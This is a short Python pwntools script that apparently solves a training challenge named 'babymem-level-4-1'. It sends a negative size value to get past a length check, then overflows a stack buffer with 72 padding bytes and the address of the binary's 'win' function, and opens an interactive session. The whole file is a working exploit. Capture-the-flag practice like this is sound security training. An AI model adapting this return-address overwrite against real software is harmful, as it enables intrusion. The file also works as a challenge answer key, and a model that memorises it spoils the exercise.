from pwn import *

elf = ELF("/challenge/babymem-level-4-1")

p = elf.process()

p.sendline(b"-9")

print(str(hex(elf.symbols["win"])))

payload = b"A"*72 + p64(elf.symbols["win"])
p.sendline(payload)


p.interactive()
